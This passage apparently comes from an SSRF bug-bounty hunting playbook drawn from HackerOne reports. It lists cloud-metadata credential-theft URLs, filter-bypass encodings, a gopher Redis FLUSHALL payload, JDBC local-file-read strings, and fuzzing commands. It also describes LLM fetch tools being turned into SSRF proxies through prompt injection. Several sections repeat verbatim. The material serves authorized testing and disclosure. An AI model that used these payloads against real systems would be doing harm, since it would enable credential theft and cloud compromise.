IMDSv2 normally requires a PUT for a token then `X-aws-ec2-metadata-token`. CVE-2025-64709 (Typebot) bypassed this where a webhook/HTTP-request component let the attacker control arbitrary headers — the attacker just injected the token header directly and pulled the EKS node role's IAM credentials, leading to cluster takeover. Azure IMDS needs `Metadata: true`; the ChatGPT Custom Actions SSRF named an attacker-controlled API-key header `Metadata` with value `true`, combined with a 302 redirect to bypass the HTTPS requirement.

Generalize: any feature allowing arbitrary outbound headers (webhook tester, API debugger, integration config) may neutralize IMDSv2/Azure protections.

### 7.3 Common root causes

- "The user said it was safe" — developers trust user-supplied URLs for fetching remote resources (link previews, thumbnails, webhooks) without validating the destination. The feature is legitimate; the missing validation is the bug.
- Allowlist bypass via redirects — developers validate the initial URL against an allowlist but configure HTTP clients to follow redirects automatically.
- Aggregated/proxy API trust — Kubernetes-style architectures where an API aggregation layer blindly proxies 30x responses from registered extension servers.
- Server-side rendering without sandboxing — headless browser features (PDF generation, link preview screenshots) execute attacker-controlled JavaScript in a network-privileged context with access to metadata services.
- XML/DSPL/file parsers fetching external entities — import features that parse structured files fetch attacker-controlled URLs, often with no URL validation at all.
- Internal hostname leakage via response differences — different error messages, timing, or response sizes for internal vs. external hosts enable blind enumeration.
- IMDSv1 still enabled — cloud deployments that haven't migrated to IMDSv2 (AWS) or haven't required the Metadata-Flavor header (GCP) allow unauthenticated credential access from any SSRF.

---

### 8.1 Techniques from real reports (337-report corpus)

One concrete lesson per report, newest and most-upvoted first. Read 5–10 before testing.

- SSRF in Exchange leads to ROOT access in all instances — #341876 · Shopify · $0 · ▲587 — found that `/v1beta1` endpoint is still available, does not require `Metadata-Flavor: Google`, and still returns the same token.
- Server-Side Request Forgery using Javascript allows to exfil data from Google Metadata — #530974 · Snapchat · $0 · ▲421 — hit `/api/v1/media/import` on ads.snapchat.com, with the URL parameter pointed at a self-hosted `ssrf.html`.
- SSRF on project import via the remote_attachment_url on a Note — #826361 · GitLab · $10,000 · ▲359 — a `remote_attachment_url=` CarrierWave uploader method accepted a direct URL; a `request header=` variant also worked unblacklisted via the header path.
- Server Side Request Forgery mitigation bypass — #632101 · GitLab · $0 · ▲350 — after the hook executed, `http://169.254.169.254` content was returned.
- Blind SSRF to internal services in matrix preview_link API — #1960765 · Reddit · $6,000 · ▲344 — `https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=`.
- TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services — #333419 · Slack · $3,500 · ▲323 — UDP packets proxied by setting XOR-PEER-ADDRESS to a private IP in a TURN send message indication (RFC 5766 §10).
- SSRF leaking internal google cloud data through upload function [SSH Keys, etc..] — #549882 · Vimeo · $0 · ▲276.
- Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion — #1189367 · Evernote · $0 · ▲264 — base64-encoded `file:///home/...` payload.
- SSRF in graphQL query (pwapi.ex2b.com) — #1864188 · EXNESS · $3,000 · ▲261 — `allTicks` query's `source` parameter accepted arbitrary GET targets.
- Unauthenticated blind SSRF in OAuth Jira authorization controller — #398799 · GitLab · $4,000 · ▲238 — POST to `/-/jira/login/oauth/callback`.
- Full Read SSRF on Gitlab's Internal Grafana — #878779 · GitLab · $0 · ▲229 — `secure.gravatar.com`'s `d` parameter allowed redirection to `i0.wp.com`.
- SSRF in webhooks leads to AWS private keys disclosure — #508459 · Omise · $0 · ▲214 — reached AWS IAM creds at `/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role`.
- Stored XSS & SSRF in Lark Docs — #892049 · Lark Technologies · $3,000 · ▲178 — stored XSS escalated to SSRF when opened in a headless browser server-side.
- SSRF on duckduckgo.com/iu/ — #398641 · DuckDuckGo · $0 · ▲165.
- Server Side Request Forgery — #644238 · Lark Technologies · $0 · ▲164.
- External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing — #1062888 · TikTok · $2,727 · ▲162 — malformed `.m3u8` header handling.
- SSRF in Autodesk Rendering leading to account takeover — #3024673 · Autodesk · $0 · ▲161.
- SSRF chained to hit internal host leading to another SSRF which allows to read internal images — #826097 · PlayStation · $1,000 · ▲148.
- DNS Rebinding SSRF in Burp Suite MCP Server Enables Internal Network Access via send_http1_request Tool — #3176157 · PortSwigger · $0 · ▲144 — attacker-controlled DNS answers first with attacker IP, then 127.0.0.1 on subsequent lookups.
- Blind SSRF on errors.hackerone.net due to Sentry misconfiguration — #374737 · HackerOne · $3,500 · ▲143 — malformed "filename" parameter produced a callback from an AWS IP.
- SSRF in https://couriers.indrive.com/api/file-storage — #2300358 · inDrive · $0 · ▲141 — full response body of fetched URL returned.
- Server Side Request Forgery (SSRF) in webhook functionality — #2301565 · HackerOne · $2,500 · ▲140.
- SSRF on music.line.me through getXML.php — #746024 · LY Corporation · $4,500 · ▲135.
- SSRF In Get Video Contents — #643622 · Semrush · $0 · ▲125 — layered userinfo/host-confusion URL tripped a parser into a 404 revealing internal parsing.
- Full read SSRF via Lark Docs import as docs feature — #1409727 · Lark Technologies · $5,000 · ▲124.
- Blind SSRF on https://my.exnessaffiliates.com/ allows for internal network enumeration — #1832494 · EXNESS · $0 · ▲120.
- Server-Side Request Forgery (SSRF) via Game Export API — #3165242 · Lichess · $0 · ▲116 — `/game/export/[GAME ID]?players=http://169.254.169.254/latest/meta-data/`.
- SSRF on image renderer — #811136 · PlayStation · $1,000 · ▲103 — `image.api.np.km.playstation.net` allowed image URLs via the `image` parameter.
- Header modification results in disclosure of Slack infra metadata to unauthorized parties — #727330 · Slack · $0 · ▲97 — port scanning via response delay differences.
- Blind SSRF in Stripo App Export via Missing Endpoints Export Email Message to Zapier — #2932960 · Stripo Inc · $0 · ▲92 — `/exportservice/v3/exports/WEBHOOK/accounts`.

### 8.4 Payload fragments observed (from writeups)

Recurring payload fragments from this class's writeups. Adapt, don't paste blindly:

```
http://[fe80::1%25eth0]/
fe80::1%eth0
http://169.254.169.254\@127.0.0.1:8000/latest/meta-data/
..%2F..%2Fapi/v0/shutdown
<script>window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";</script>
<script>window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json";</script>
```

---

### Cloud Metadata Payloads

```bash
# GCP - requires Metadata-Flavor header (test if server adds it automatically)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/project/project-id
http://metadata/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# AWS IMDSv1 (no auth required)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
# AWS ECS task credentials (retrieve from env var AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}

# Azure - instance metadata and managed identity token
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires Metadata: true header for Azure requests

# Kubernetes service account credentials (file:// SSRF)
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

### Localhost/Internal Port Payloads

```bash
# Kubernetes internals
http://127.0.0.1:6443/api/v1/namespaces
http://10.0.0.1:6443/api/v1/secrets
http://127.0.0.1:10250/pods          # kubelet
http://127.0.0.1:2379/v2/keys        # etcd

# Common internal services
http://127.0.0.1:6379/               # Redis (check for inline commands)
http://127.0.0.1:9200/_cat/indices   # Elasticsearch
http://127.0.0.1:5601/               # Kibana
http://127.0.0.1:8500/v1/catalog/services  # Consul
```

### Blocklist Bypasses (When `localhost`, `127.0.0.1`, `169.254.x.x` are blocked)

```
# IPv6 equivalents
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:169.254.169.254]/

# Decimal/octal/hex encoding of IP
http://2130706433/          (127.0.0.1 decimal)
http://0x7f000001/          (127.0.0.1 hex)
http://0177.0.0.1/          (octal)
http://127.1/               (short form)
http://0/                   (resolves to 0.0.0.0)

# DNS rebinding - register a domain that resolves to internal IP after first check
# Use https://lock.cmpxchg8b.com/rebinder.html

# Subdomain pointing to internal IP
http://localtest.me/         (resolves to 127.0.0.1)
http://127.0.0.1.nip.io/
http://customer.attacker.com/ (A record → 192.168.1.1)

# URL parser confusion
http://evil.com@127.0.0.1/
http://127.0.0.1#evil.com
http://127.0.0.1%25@evil.com  (URL encoding)
http://evil.com\.127.0.0.1/   (backslash)

# Protocol confusion
file:///etc/passwd
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/_FLUSHALL  (Redis via gopher)
sftp://attacker.com:11111/
ldap://127.0.0.1/

# Redirect chain bypass
https://allowlisted-domain.com → HTTP 301 → http://169.254.169.254/

# Case variation / URL encoding
http://Localhost/
http://127.0.0.1%2F@evil.com/
```

### App-layer input-encoding bypass (filter sees one thing, fetcher another)

When the endpoint takes the target URL **wrapped/encoded** — a base64 blob in the path, a
double-encoded param, a JSON-nested value — the front-end WAF/allowlist inspects the *raw*
input while the backend **decodes it before fetching**. Encode the internal target so the
filter never sees `169.254` / `localhost` in clear:
```
# target URL base64'd into a path segment the app decodes, then fetches
GET /proxy/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8=/x.js   # = http://169.254.169.254/  (disclosed: reports/1189367)
# double-URL-encode the host so one decode pass survives the filter
url=http%253A%252F%252F169.254.169.254%252F
```
Always test whether the parameter is decoded once, twice, or base64'd before the fetch — the number of decode passes is the bug.

### Path-normalization / semicolon bypass (front-end filter vs origin path)

A front-end that blocks `url=` to internal hosts can be skipped when the origin re-normalizes
path segments the edge left intact — inject `;/`, `/../`, or matrix-param segments so the edge
routes it as benign but the origin resolves the SSRF fetch:
```
GET /;/;/resource/md/get/url?url=http://oast.example/   # edge ignores, origin fetches (disclosed: reports/2035332)
```
Full-read SSRF via this path-confusion reaches cloud-credential endpoints the direct `url=` param blocked.

### Schema/Protocol Bypasses

```
# When only http/https allowed but implementation is loose
http://169.254.169.254:80@evil.com/
//169.254.169.254/
```

## Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### OOB-Or-It-Didn't-Happen Gate (Read First)

**Claims of blind SSRF require an out-of-band (OOB) confirmation. Always. No exceptions.**

OOB means: a Burp Collaborator domain, an `interactsh-client` listener, a canarytoken, or any DNS+HTTP receiver you control that confirms the server actually made an outbound network connection on your behalf.

### What is NOT confirmation of SSRF

- The server **echoing your URL back in an error message**. Example: `"The Web application at http://evil.example.com/x could not be found"` — this is the server formatting your input into an error string, NOT making an outbound HTTP request. The error came from string formatting, not from network failure.
- The server returning a different status code for an external URL vs `localhost`. Different error responses can come from URL-scheme validators, not from actual fetching.
- A delayed response when the URL is sent. Delay can come from DNS resolution attempts within the parser, not from completed HTTP fetches.

### What IS confirmation of SSRF

- A DNS lookup for your unique Collaborator subdomain appears in the OOB listener.
- An HTTP request to your Collaborator HTTP endpoint with the server's source IP and User-Agent.
- For SSRF in JavaScript-execution contexts (PDF renderers, headless browsers), a fetch from the server to your callback URL.

### Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Can you retrieve a response proving internal network access? (Show the metadata token, internal API response, or confirmed DNS callback)
   - If blind: can you demonstrate port differentiation or confirmed OOB callback tied to a specific internal address?
   - "The server makes a request" alone is insufficient — show *where* it goes and *what comes back*.

2. **What does the victim LOSE?**
   - Cloud credentials (IAM tokens) → full cloud account compromise?
   - Internal service data (user PII, secrets, API keys)?
   - Ability to pivot to RCE via internal admin service?
   - If the answer is only "the server fetches my URL," severity is low — quantify the actual reachable blast radius.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable endpoint still live and the parameter still present?
   - Does your callback server show the hit reliably (not intermittently)?
   - Can a second person follow your steps without prior knowledge and get the same result?
   - If reproduction requires specific timing, tokens, or luck — resolve the flakiness before submitting.

---

### C. Validation / proof bar — how to confirm the bug and avoid false positives

- **OOB gate is mandatory (Part 2 above):** one unique Collaborator/interactsh DNS+HTTP interaction per candidate field is the minimum proof of a blind sink. A server echoing your URL in an error is NOT SSRF.
- **Full-read vs blind:** fetch `https://example.com/` and check whether its body is reflected (`<title>Example Domain</title>`). Reflected body = full-read, score higher. Body-diff a link-local target against an external one; a distinct status (e.g. `401` from `169.254.169.254`) proves reach to a non-routable address.
- **Quantify the metadata hit:** show the exact path and the returned token/role name (redact the secret) — "server reached 169.254.169.254" with no returned metadata is weak. For IMDSv2 show the PUT token step, or explicitly note the hop-limit/container constraint.
- **False-positive discipline for rebinding:** a callback that only arrives after many attempts can be a flaky DNS race. Require repeatability (e.g. 3/5 successes) and record the DNS answer sequence. Do not claim exploitability if validation is pinned at the connection layer.
- **Attribution & negative controls:** include at least one inert parameter that produces no callback so the client patches the real sink. Keep the PoC within scope — stop at token/role-name retrieval, do not pivot into the cloud account.
- **Reproducibility:** one curl/Burp Repeater request, a live listener, and a second tester who can repeat it in under 10 minutes.

### What is NOT confirmation of SSRF

- The server **echoing your URL back in an error message** (e.g. `"The Web application at http://evil.example.com/x could not be found"`) — this is string formatting, not network failure.
- A different status code for an external URL vs `localhost` — could come from URL-scheme validators, not actual fetches.
- A delayed response when a URL is sent — delay can come from DNS resolution attempts within the parser, not completed HTTP fetches.

### 4.0 Gate 0 baseline checks (before reaching for exotic vectors)

- Does the guard parse the URL at the same layer/parser as the actual fetcher? If the parameter passes through any decoding or normalization before the fetch (path-segment base64, double URL-encoding, JSON nesting, a `normalize()`-style helper), test host resolution under at least two decode passes — validator/fetcher disagreement is the root cause of several 2025 CVEs (§4.3).
- Does the guard's "private IP" definition include IPv6 transition addresses, `0.0.0.0`, `::`, and link-local — not just 127.0.0.0/8, ::1, and RFC1918? Most guards only check the first set (§4.1, §4.2).
- If the HTTP response body isn't returned, does content leak elsewhere — error messages, async job/event objects, logs, or a rendered PDF/image? (§4.9).
- Are custom request headers controllable? (webhook tester, API debugger, integration config). If so, IMDSv2 and Azure's `Metadata: true` requirement may not actually be a protection (§4.8).

### Part 10 — Pre-report Gate 0 validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Can you retrieve a response proving internal network access? (Show the metadata token, internal API response, or confirmed DNS callback.)
   - If blind: can you demonstrate port differentiation or confirmed OOB callback tied to a specific internal address?
   - "The server makes a request" alone is insufficient — show where it goes and what comes back.
   - Grade your evidence on the E0–E5 scale (§5.3). E2 minimum, E3+ preferred.
2. **What does the victim LOSE?**
   - Cloud credentials (IAM tokens) → full cloud account compromise?
   - Internal service data (user PII, secrets, API keys)?
   - Ability to pivot to RCE via internal admin service?
   - If the answer is only "the server fetches my URL," severity is low — quantify the actual reachable blast radius.
3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable endpoint still live and the parameter still present?
   - Does your callback server show the hit reliably (not intermittently)?
   - Can a second person follow your steps without prior knowledge and get the same result?
   - If reproduction requires specific timing, tokens, or luck — resolve the flakiness before submitting.

**Reporting bar:** Prove real impact on a second controlled account or a safe callback. Keep the PoC minimal and reproducible; include raw requests and exact IDs. Stay inside program scope and follow disclosure rules.

---

## Escalation and related chains

### Escalation chains

- Metadata -> cloud keys -> S3/account takeover.
- Internal admin panel -> RCE.
- Redis/Memcached via gopher -> RCE.

### Related Skills & Chains

- **`cloud-iam-deep`** — SSRF is the canonical entry to cloud metadata service. Chain primitive: SSRF → IMDSv1 token theft → `cloud-iam-deep` privilege escalation reaches `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
- **`llm-ai`** — LLMs with fetch_url tools become SSRF proxies bypassing network egress controls. Chain primitive: LLM tool-use (fetch_url) + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
- **`rce`** — Internal Redis/Memcached are unauthenticated by default and reachable via gopher://. Chain primitive: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
- **`cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
- **`security-arsenal`** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6 mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
- **`triage-validation`** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Burp Collaborator hit with a unique marker before report submission.

### 4.11 Connection-string SSRF (JDBC / Redis / Mongo / LDAP) with file-read escalation

Any "test connection"/"data source config" feature accepting JDBC/Redis/Mongo/LDAP URLs is a blind-SSRF + potential file-read dual vector. Dinky (≤1.2.5) and SpringBlade's `testConnect`: attacker supplies a MySQL JDBC URL, probes internal hosts/ports via driver error timing (SSRF/port-scan), then sets `allowLoadLocalInfile=true` to abuse `LOAD DATA LOCAL INFILE` and read arbitrary files (configs, private keys) off the app host:

```
jdbc:mysql://internal-host:3306/test?allowLoadLocalInfile=true
```

### 7.1 Escalation chains

- Metadata → cloud keys → S3/account takeover
- Internal admin panel → RCE
- Redis/Memcached via gopher → RCE
- SSRF → CSRF → RCE (GitHub Enterprise pattern)
- Screenshot / PDF renderer → cloud metadata → container root

### Related skills & chains

- **hackerone-open-redirect** (385 reports) — SSRF bypass via trusted-domain open redirects.
- **hackerone-rce** (1,399 reports) — Redis/Memcached via gopher → RCE.
- **hackerone-info-disclosure** (1,827 reports) — internal file/endpoint leakage.
- **cloud-iam-deep** — SSRF → IMDSv1 token theft → privilege escalation to `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
- **hunt-llm-ai** — LLMs with `fetch_url` tools become SSRF proxies bypassing network egress controls. Chain: LLM tool-use + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
- **hunt-rce** — Internal Redis/Memcached are unauthenticated by default and reachable via `gopher://`. Chain: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
- **hunt-cloud-misconfig** — Internal-only buckets/APIs become reachable through SSRF egress. Chain: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal `/admin` or private S3 bucket read.
- **security-arsenal** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6-mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
- **triage-validation** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Collaborator hit with a unique marker before report submission.

### Related Skills & Chains

- **`cloud-iam-deep`** — SSRF is the canonical entry to cloud metadata service. Chain primitive: SSRF → IMDSv1 token theft → `cloud-iam-deep` privilege escalation reaches `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
- **`hunt-llm-ai`** — LLMs with fetch_url tools become SSRF proxies bypassing network egress controls. Chain primitive: LLM tool-use (fetch_url) + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
- **`hunt-rce`** — Internal Redis/Memcached are unauthenticated by default and reachable via gopher://. Chain primitive: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
- **`hunt-cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
- **`security-arsenal`** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6 mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
- **`triage-validation`** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Burp Collaborator hit with a unique marker before report submission.

## Tools and wordlists

### Tools

`interactsh` · `Burp Collaborator` · `ssrfmap` · `httpx` · `ffuf`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_ssrf.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_ssrf.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf.txt` | 85 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf_waf.txt` | 26 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_ssrf.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_ssrf.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_ssrf.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Set up an interactsh/OAST listener first; SSRF templates often only prove outbound traffic.

```sh
nuclei -u https://target -tags ssrf,oast \
       -severity low,medium,high,critical -rl 40 -o nuclei_ssrf.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/ssrf -dast \
       -rl 40 -o nuclei_ssrf_ssrf.txt
nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/ssrf-via-proxy.yaml \
       -rl 40 -o nuclei_ssrf_ssrf-via-proxy.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### 1.2 Parameter wordlist

When fuzzing for hidden SSRF-prone parameters (Arjun, Burp Intruder, ffuf):

```
url, uri, link, href, src, source, target, dest, destination, redirect,
redirect_uri, return, returnTo, next, continue, callback, callback_url,
webhook, webhook_url, feed, rss, path, file, filename, filepath, folder,
host, hostname, domain, port, ip, address, proxy, fetch, load, import,
api_url, endpoint, service_url, data, reference, document, avatar, image,
image_url, thumbnail, preview, media, download, upload_url, out, to, page
```

Parameters observed in disclosed reports: `url, hash, username, template, password, id, data, payload, alt, format, email, month, year, template[], image, name, target, start, command, user_id`.

### 5.4 Expanded agentic / MCP tool inventory

When the target is agentic, inventory every tool that can cause network access, not just ones literally named `fetch`:

| Tool class | What to check |
|---|---|
| Direct fetch tool | Arbitrary URL/host reaches an HTTP client with no re-validation |
| Browser navigation tool | Main-frame AND subresource policy; screenshot/evaluation permissions separate from navigation |
| Document ingestion / RAG loader | Parser makes hidden secondary requests (remote images, XML includes) while "just" converting a doc |
| Search connector | Is the provider/base URL itself attacker-influenceable? |
| Workflow HTTP node | Stored destination + delayed worker execution — re-validated at run time or only at save time? |
| MCP server discovery/config | Does changing remote server metadata influence later connections? |
| Code-execution tool | Does the sandbox expose sockets/requests/fetch to generated code? |
| LLM media loader | image_url/audio_url/document references fetched by inference infra itself, before the model ever "does" anything |

Distinct trust boundaries worth testing independently: direct prompt vs. indirect instructions buried in a page/file/email/RAG chunk (prompt-injection-driven SSRF); UI validation vs. tool-adapter validation; one tool's output becoming a second tool's URL argument (tool chaining); your account's identity vs. a more privileged agent/service identity performing the actual fetch.

### 5.6 Source-code grep patterns

```bash
# Find URL fetch operations
grep -rE "(fetch|curl|urllib|requests\.get|http\.get|axios\.get)\s*\(" --include="*.py" --include="*.js" --include="*.go"

# Find URL parameters being passed to HTTP clients
grep -rE "(url|uri|endpoint|redirect|src|source)\s*=\s*req\.(query|body|params)" --include="*.js"

# Find redirect following
grep -rE "(follow_redirects|allow_redirects|followRedirects)\s*=\s*[Tt]rue"
```

---

### 9.1 Tools

interactsh · Burp Collaborator · ssrfmap · httpx · ffuf · arjun

### 9.2 Wordlists

Mined from this class's writeups and ready for ffuf/feroxbuster. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_ssrf.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_ssrf.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf.txt` | 85 |
| `~/.local/share/hackerone-reports/wordlists/payloads_ssrf_waf.txt` | 26 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

### Grep Patterns for Source Code Review

```bash
# Find URL fetch operations
grep -rE "(fetch|curl|urllib|requests\.get|http\.get|axios\.get)\s*\(" --include="*.py" --include="*.js" --include="*.go"

# Find URL parameters being passed to HTTP clients
grep -rE "(url|uri|endpoint|redirect|src|source)\s*=\s*req\.(query|body|params)" --include="*.js"

# Find redirect following
grep -rE "(follow_redirects|allow_redirects|followRedirects)\s*=\s*[Tt]rue"
```

## Real-world examples

### 7.2 Real impact examples

**Scenario A: Cloud credential exfiltration via link preview (Snapchat / GCP pattern).** A public-facing "link preview" API accepted a `url` parameter and fetched the target server-side to generate a thumbnail. The feature ran on GCP Compute Engine with IMDSv1 enabled and no Metadata-Flavor header enforcement on the server side. By supplying `url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`, the attacker received a valid OAuth2 access token for the instance's service account. The token granted access to internal GCP project resources including storage buckets containing user data. The attacker used JavaScript execution within a headless rendering context to exfiltrate the token via DNS-encoded subdomains, bypassing response body restrictions.

**Scenario B: Kubernetes API compromise via hijacked aggregated server.** An attacker who could register a Kubernetes API extension server (metrics-server equivalent) returned `302 Location: http://127.0.0.1:6443/api/v1/secrets` responses to the aggregation layer. Because the aggregation proxy followed redirects automatically without re-validating the destination against the internal network blocklist, the redirect caused the aggregation layer itself (running with elevated cluster credentials) to fetch internal Kubernetes API secrets and return them in the response. Effective privilege escalation from limited API registration privileges to full cluster secret read access.

### 8.2 Detailed case studies (curated)

- **SSRF in Exchange leads to ROOT access in all instances** — #341876 · Shopify · $0 · medium · 2018-05-23 · ▲587. Chain: create a store → edit `password.liquid` template → install Exchange app and list a store → wait for screenshot service to render it → download/convert the resulting image to recover leaked metadata-service content.
- **Server Side Request Forgery (SSRF) via Analytics Reports** — #2262382 · HackerOne · $25,000 · critical · 2023-12-08 · ▲529. Internal files readable via SSRF in an analytics-report generation path.
- **Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata** — #530974 · Snapchat · $0 · n/a · 2020-11-30 · ▲421. Reached via business.snapchat.com creative library → "Topsnap Media" → Create → load a template → replace an image via Import, which was the SSRF sink.
- **SSRF on project import via the remote_attachment_url on a Note** — #826361 · GitLab · $10,000 · high · 2020-06-07 · ▲359. The Note model's CarrierWave uploader supported a `remote_attachment_url=` method for downloading/attaching a file via URL.
- **Server Side Request Forgery mitigation bypass** — #632101 · GitLab · $0 · high · 2020-04-18 · ▲350. Flawed DNS-rebinding protection in `lib/gitlab/url_blocker.rb` — the validator performed a DNS lookup to check whether a domain's IP belonged to the local network, but the actual fetch re-resolved.

## Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class ssrf --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class ssrf
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class ssrf
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class ssrf --min-bounty 1000
```

### Related

- `hackerone-open-redirect` (385 reports)
- `hackerone-rce` (1,399 reports)
- `hackerone-info-disclosure` (1,827 reports)

### Related

- `open-redirect` (385 reports)
- `rce` (1,399 reports)
- `info-disclosure` (1,827 reports)

### D. Sources — numbered list of the actual URLs you fetched

1. https://portswigger.net/web-security/ssrf
2. https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
3. https://github.com/advisories/GHSA-h6x2-583h-x99r
4. https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html

### 9.6 Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class ssrf --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class ssrf
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class ssrf
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class ssrf --min-bounty 1000
```

---

## Additional notes

### Loopback & internal services

```text
http://127.0.0.1/
http://127.0.0.1:80/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://127.1/
http://127.0.1/
http://2130706433/
http://0x7f000001/
http://0177.0.0.1/
http://127.0.0.1.nip.io/
http://127.0.0.1.sslip.io/
http://localtest.me/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://127.0.0.1:22/
http://127.0.0.1:6379/
http://127.0.0.1:11211/
http://127.0.0.1:9200/
http://127.0.0.1:8080/
http://127.0.0.1:3000/
http://127.0.0.1:8500/v1/catalog/services
```

### Cloud metadata

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/openstack/latest/meta_data.json
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://100.100.100.200/latest/meta-data/
http://192.0.0.192/latest/meta-data/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Redirect & DNS tricks

```text
